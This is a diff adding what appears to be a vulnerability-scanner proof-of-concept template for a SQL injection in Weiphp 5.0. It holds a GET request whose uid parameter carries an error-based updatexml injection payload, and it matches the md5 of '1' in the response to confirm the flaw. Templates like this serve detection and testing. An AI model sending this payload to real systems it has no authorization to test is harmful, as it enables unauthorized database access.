@@ -1,0 +1,14 @@
+id: poc-yaml-weiphp-sql-injection
+info:
+  name: Weiphp 5.0 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: Weiphp
+  osprey-id: vb_2019_0087
+requests:
+- method: GET
+  path: /index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)%20--%20+
+  expression: contains(body, "c4ca4238a0b923820dcc509a6f75849")
+variables: {}
+transport: http
